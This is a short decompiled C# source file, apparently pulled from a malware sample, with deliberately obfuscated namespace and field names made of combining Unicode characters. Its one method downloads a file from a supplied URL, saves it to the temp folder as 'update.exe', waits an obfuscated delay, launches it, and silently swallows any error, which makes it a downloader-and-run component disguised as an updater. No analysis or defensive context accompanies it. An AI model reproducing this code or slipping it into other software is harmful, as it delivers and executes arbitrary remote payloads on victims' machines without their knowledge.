using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;

namespace \u030E\u0360\u0313\u034E\u0315\u0E47\u0020\u0305\u035C\u0351\u0E47\u0351\u0320\u0301\u036B\u0300zcryfxllszuahcty\u0347\u0334\u0342\u0E47\u0310\u032C\u0358\u0340\u036B\u0331\u0329\u036B\u0340\u032F\u0308\u0E47cexuwlosbhsreyjl
{
	// Token: 0x02000072 RID: 114
	internal class Class_87
	{
		// Token: 0x0600020C RID: 524 RVA: 0x00011430 File Offset: 0x0000F630
		public static void tmethod_252(string str_0)
		{
			byte[] bytes = null;
			try
			{
				using (WebClient webClient = new WebClient())
				{
					bytes = webClient.DownloadData(str_0);
				}
				File.WriteAllBytes(Path.GetTempPath() + "\\update.exe", bytes);
				Thread.Sleep(Class_84.\u0E47\u0343\u0349i\u034E\u035C\u0360\u032D\u0324\u0359\u0308\u0353\u0020\u032D\u0308\u0326rjccjcfyzkdytadx\u0E47\u035C\u0347\u032C\u032F\u033B\u0340\u031A\u036A\u0322\u0367\u0350\u0323\u033F\u0E47\u0356qdzyqyfjehqzwipc);
				Process.Start(Path.GetTempPath() + "\\update.exe");
			}
			catch
			{
			}
		}
	}
}
